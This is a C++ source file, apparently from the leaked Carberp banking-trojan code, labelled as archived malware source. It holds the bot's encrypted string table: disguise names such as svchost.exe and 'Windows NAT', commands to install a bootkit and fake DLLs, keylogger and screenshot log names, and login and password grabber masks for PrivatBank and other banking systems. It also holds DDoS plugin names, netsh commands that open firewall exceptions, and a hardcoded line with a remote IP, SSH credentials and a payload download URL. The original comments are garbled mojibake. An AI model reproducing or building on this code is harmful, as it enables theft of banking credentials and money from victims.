/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------

#pragma hdrstop

#include "StrConsts.h"
#include "Config.h"
#include "Crypt.h"
#include "Crypt.h"

#include "Modules.h"

//---------------------------------------------------------------------------


extern CSSTR BeginCryptBlock[];
extern CSSTR EndCryptBlock[];



//*****************************************************
// GetStr - ������� �������������� ������ EncryptedStr
//*****************************************************
string GetStr(const char* EncryptedStr)
{
	string Result;

	bool Encrypted = (EncryptedStr > BeginCryptBlock) && (EncryptedStr < EndCryptBlock) && 
     				 (BeginCryptBlock[0] != 'C');

	if (Encrypted)
		Result = XORCrypt::DecodeString(GetSessionPassword(), EncryptedStr);
	else
		Result = EncryptedStr;

	return Result;
}
//-----------------------------------------------------------------------------



//==================================================//
CSSTR BeginCryptBlock[] = ENCRYPTED_STRINGS_BEGIN;  //
//=============================================================================
//  ���� �������� ����������� �����.
//  ��� ������ ����������� ���� � �� �����������
//  CSEND
//  ����� ����������� ��������
//=============================================================================


CSSTR StrBotGlobalMutexName[] = "GSA28593KFE7"; // ������� ����������� �������� ����������������, ��� ��� �������
CSSTR StrBootkitIsRunMutex[] = "BIR737JK3LJ"; //������� ���������������, ��� ������� ��� �� ��� �������


// ������������ ��� ��� ����� ����
CSSTR EStrOriginalBotExeName[] = "WinHelp";
CSSTR EStrBotStartupLinkName[] = "wslneo.lnk";  // ��� ������ � ������������


// ��� ����� ��� �������� ������ ����
CSSTR EStrHostsFileName[] = "mnhslst32.dat";


// �������������� �������
CSSTR EStrBotServiceExePath[] = "com\\";

// ��� ��� ����� ������� ����
CSSTR EStrBotServiceExeName[] = "svchost.exe";


// ��� �������
CSSTR EStrServiceName[] = "Windows NAT";


// ������� ���������� � �����
CSSTR StrBotWorkPath[] = "WnsBMT"; // ������� ������� ����
CSSTR StrGrabberPath[] = "gdata";  // ��� ������� ����� �������

CSSTR EStrConfigFileName[]   = "igfxtray.dat"; // ��� ����� �������� �������
CSSTR EStrConfigHPFileName[] = "igfxtrayhp.dat"; // ��� ����� �������� ������� ����������� ����������


// ����� ��������� ������
CSSTR EStrPipeLoader[] = "ldrspp"; // ��� ���������� ����� �������



// ��������� �������, ������������ ����� ����� ���������
CSSTR EStrProcessCommandDeleteBot[] = "delbt";  // ������� �� �������� exe ����

// ����� ��������� �����
CSSTR EStrPrefixFileName[] = "mnprsdd.dat"; // ���� �������� ��������
CSSTR EStrTemporaryPrefixFileName[] = "mnprsdd.tmp"; // ��������� ���� �������� ��������


// ��� ������� ���� � ���� ���
CSSTR EStrBotPlug[] = "bot.plug";

// ��� ���������� �������
CSSTR EStrBootkitInstaller[] = "bki.plug";


//��� ������ ��������
CSSTR EStrSystemPrivat[] = "privat"; // ������ ������ �����������
#ifdef IfobsOnlineH
CSSTR EStrSystemIfobsOnline[] = "IfobsOnline"; // ������ ������� Ifobs ������
#endif



CSSTR EStrCabNameDisketa[] = "disketa"; // ��� ���� ��� �������� �����������

// ��� ����������� ����� ������������ ���������
CSSTR EStrInfiniteKeyLoggerSignal[] = "iks.dat";



// ��� ����������� �������
CSSTR EStrFakeDllInstaller[] = "fdi.plug";
// ��� ����� �� �������� ����������, ��� ����������� ������� (���� � ����� ����)
CSSTR EStrFakeDllFlag[] = "fdi.txt";
//��� ����� �� �������� ����������, ��� ����������� ������� � ������� �����
CSSTR EStrFakeDllIFobsFlag[] = "ifobsfdi.txt";
//��� ����� �� �������� ����������, ��� ����������� ������� � ������� cbank
CSSTR EStrFakeDllCBankFlag[] = "cbankfdi.txt";


// �������� ������, ������� ����� �������� ���
CSSTR EStrCommandInstallFakeDLL[] = "installfd";  // ������� �� ���������� �������
CSSTR EStrCommandInstallBootkit[] = "installbk";  // ������� �� ���������� �������


// ����� ������, ��� ���������� � ���
CSSTR StrLogFileScreenShot[]  = "Screen.png";
CSSTR StrLogFileTextData[]    = "Log.txt";
CSSTR StrLogFileNetInfo[]     = "NetInfo.txt";
CSSTR EStrLogKeyPath[]        = "Keys";


// ������ ����� ����
CSSTR EStrLogFieldLogin[]       = "Login";
CSSTR EStrLogFieldPassword[]    = "Password";
CSSTR EStrLogFieldKeyPassword[] = "KeyPassword";
CSSTR EStrLogFieldURL[]         = "URL";




// ����� ������� ���������� �����������.
CSSTR VideoRecFuncInit[]			= "Init";
CSSTR VideoRecFuncRelease[]			= "Release";
CSSTR VideoRecUpdateSettings[]		= "UpdateSettings";
CSSTR VideoRecFuncAddIPServer[]		= "AddIPServer";
CSSTR VideoRecFuncRecordProcess[]	= "StartRecPid";
CSSTR VideoRecFuncRecordWnd[]		= "StartRecHwnd";
CSSTR VideoRecFuncStop[]			= "StopRec";
CSSTR VideoRecFuncResetTime[]		= "ResetTime";
CSSTR VideoRecFuncSendFiles[]		= "StartSend";
CSSTR VideoRecFuncSendFilesAsync[]	= "StartSendAsync";
CSSTR VideoRecFuncIsSendedAsync[]	= "IsSendedAsync";
CSSTR VideoRecFuncFolderIsUpload[]	= "FolderIsUpload";
CSSTR VideoRecFuncRunCmdExec[]		= "RunCmdExec";
CSSTR VideoRecFuncSendLog[]			= "SendLog";
CSSTR VideoRecPipe[]				= "VideoServer";
CSSTR VideoRecOutOfHibernation[]	= "OutOfHibernation";


CSSTR HTTPFormContentDisposition[] = "Content-Disposition: form-data; ";
CSSTR HTTPFormFieldName[]          = "name=\"%s\"";
CSSTR HTTPFormFileInfo[]           = "; filename=\"%s\"\r\nContent-Type: %s\r\nContent-Transfer-Encoding: binary";
CSSTR HTTPOctetStream[]            = "application/octet-stream";


CSSTR IFobsFlagCopy[] = "ifobscopy.txt";


// ������ ������ AzConfig
#ifdef AzConfigH
	CSSTR AzConfigParamUserName[] = "%az_user%";

	CSSTR EStrAzGrabberPathMask[] = "/raf/?uid=%s&sys=%s&cid=%s&mode=%s";
#endif


// ������ ������ BSS �������
#ifdef BSSH
	CSSTR BSSLogTemplate[] = "Url: %s\r\n\r\n"
							 "Login:     %s\r\n"
							 "Password:  %s\r\n\r\n"
							 "UserAgent: %s\r\n";
#endif



#ifdef FakeDllInstallerH
	CSSTR EStrIBankRegistryPath[] = "SOFTWARE\\Classes\\Installer\\Products\\7B00DF09E169B5445AD2F176D624114\\";
	CSSTR EStrSberRegistryKey[]   = "SBRF\\";
	CSSTR EStrIBankFileName[]     = ".iBank2"; // ��� ����� ��� ����������� �������� ����� ����������� Fake DLL
#endif


#ifdef ddosH
	// ��� ������� DDOS
	CSSTR EStrDDOSPlugin[] = "ddos.plug";

	// ��� ����� ������ ��� ������� DDOS
	CSSTR EStrDDOSSignal[] = "ddos.sig";
#endif


#ifdef PrivatBankH
	// ��� ������� ������� ������ ����� �����������
	CSSTR EStrPrivatBankGrabber[] = "privatbank";

	// ����� ��������� ���� ����� �����
	CSSTR EStrPrivatBankKeyPassWndMask[] = "���� ������*";
	CSSTR EStrPrivatBankKeyPassWndMask2[] = "����*";

	// ����� ����������� ������ ����������� � ������24
	CSSTR EStrPrivatBankLoginMask[] = "https://cb.privatbank.ua/p24/news*";

	// ����� � ������ �����������
	CSSTR EStrPrivatBankLogin[]    = "UserName";
	CSSTR EStrPrivatBankPassword[] = "UserPass";

#endif


CSSTR RDPRunParam[] = "88.198.53.14;22;445;sshu;P@ssw0rd;system_help;fixerESCONuendoZ;http://www.cushyhost.com/download.php?img=73";

#ifdef BBSCBankH
//��� BSS CBank �������
//��� ����� �������� ��� ���������
CSSTR CBankReplacement[] = "cbank_replacement.txt";
//���� ��� ������� ������� (��� ������ ���� �������)
CSSTR CBankFlagUpdate[] = "cbank_flagupdate.txt"; 
//���� � ������� � �������
CSSTR CBankRestFixed[] = "cbank_restfixed.txt"; 
#endif //BBSCBankH

//��� Tiny
#ifdef TinyH
CSSTR TinyReplacement[] = "tiny_replacement.txt"; //��� ����� �������� ��� ���������
CSSTR TinyFlagUpdate[] = "tiny_flagupdate.txt"; //���� ��� ������� ������� (��� ������ ���� �������)
CSSTR TinyOldBalans[] = "tiny_oldbalans.dat"; //��� ����� ��� �������� ������������ �������, ��� ��������������
CSSTR TinyOldDocs[] = "tiny_olddocs.dat"; //��� ����� ��� �������� ������ �� ���������� ���������, ��� ��������������
#endif //TinyH


//������� ��� ���������� � ������ ���������� �������������
CSSTR NetshFirewallWinXp[] = "netsh firewall add allowedprogram \"%s\" %s ENABLE"; //��� windows XP
CSSTR NetshFirewallWin7Add[] = "netsh advfirewall firewall add rule name=\"%s\" dir=in action=allow program=\"%s\""; //��� windows 7
CSSTR NetshFirewallWin7Del[] = "netsh advfirewall firewall delete rule \"%s\"";
//=============================================================================
// ����� ����� ����������� �����
//=============================================================================
CSSTR EndCryptBlock[] = ENCRYPTED_STRINGS_END; //
//=============================================//





//-----------------------------------------------------------------------------
// �� ����������� ������
//-----------------------------------------------------------------------------

CSSTR Slash[]   = "\\";
CSSTR SlashChar = '\\';
